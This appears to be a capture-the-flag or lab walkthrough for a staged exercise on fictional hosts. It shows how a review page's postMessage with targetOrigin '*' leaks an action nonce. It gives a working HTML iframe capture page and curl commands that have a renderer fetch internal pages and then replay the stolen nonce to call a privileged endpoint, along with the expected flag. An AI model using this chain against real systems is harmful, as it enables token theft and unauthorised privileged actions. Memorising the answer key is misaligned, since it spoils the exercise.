# K12.2 Walkthrough: A value across the action boundary

## Prerequisite

K12.1 complete. PRV-771 is in state=loaded with an `action_nonce` stored server-side.

## Vulnerability

The internal review session page (`http://127.0.0.1:9000/review-session/PRV-771`) sends the action nonce via `window.parent.postMessage` with `targetOrigin="*"`. Any same-origin parent frame that hosts it as an iframe receives the nonce. Only Chromium inside the container can reach `127.0.0.1:9000`.

## Craft the nonce-capture page

Create a file `capture.html`:

```html
<!DOCTYPE html>
<html>
<head><title>nonce-capture</title></head>
<body>
<div id="out">waiting</div>
<iframe id="rs" src="http://127.0.0.1:9000/review-session/PRV-771" style="display:none"></iframe>
<script>
window.addEventListener('message', function(e) {
  document.getElementById('out').textContent = JSON.stringify(e.data);
});
</script>
</body>
</html>
```

## Submit to K10.3 render endpoint

```
curl -sS --cacert ~/.local/share/keplerops/ca.crt -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  --data-binary '{"source_url":"http://127.0.0.1:9000/capture-nonce","content":"<HTML from above>"}' \
  https://preview.keplerops.test/api/preview/documents
```

Alternatively, host `capture.html` from your participant-controlled source and submit the URL for Gotenberg to render. Gotenberg loads the page inside the container, the iframe fires, and the nonce appears in the rendered DOM.

Extract the nonce from the rendered HTML output. It is in the `out` div as `{"action_nonce":"<hex>","review_id":"PRV-771"}`.

## Use nonce to call prepare

```
NONCE=<action_nonce from rendered output>

curl -sS --cacert ~/.local/share/keplerops/ca.crt -X POST \
  -H "Authorization: Bearer $NONCE" \
  https://preview.keplerops.test/api/preview/reviews/PRV-771/prepare
```

Expected output:

```json
{"flag":"FLAG{9d14e5b959bb4bb5}","prepared":true,"queue":"privileged-review","result_id":"PRVPRP-XXXXXXXXXX","review_id":"PRV-771","schema":"fieldkest.preview-preparation/v1","source_id":"doc-9bc054d6f95dfa6a"}
```

The nonce is consumed on first use. PRV-771 transitions to state=prepared. K12.3 worker processes it next.
